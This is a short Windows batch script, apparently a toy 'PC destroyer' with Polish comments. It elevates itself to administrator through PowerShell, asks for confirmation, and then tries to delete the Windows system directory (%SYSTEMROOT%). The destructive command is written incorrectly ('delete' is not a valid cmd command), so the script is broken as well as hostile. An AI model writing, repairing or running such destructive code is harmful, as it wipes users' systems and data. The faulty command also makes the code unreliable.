@echo off
title Pc World Destroyer 0.0.1

:: Sprawdzenie uprawnień administratora
net session >nul 2>&1
if %errorlevel% neq 0 (
    powershell -Command "Start-Process '%~f0' -Verb RunAs"
    exit /b
)

:wybor
echo Do you want to continue? (T/N)
choice /c TN /n /m "Select: "
if errorlevel 2 goto no
if errorlevel 1 goto yes

:yes
echo Continuing...
delete %SYSTEMROOT%
pause
goto koniec

:no
echo Canceling...
exit

:koniec
pause
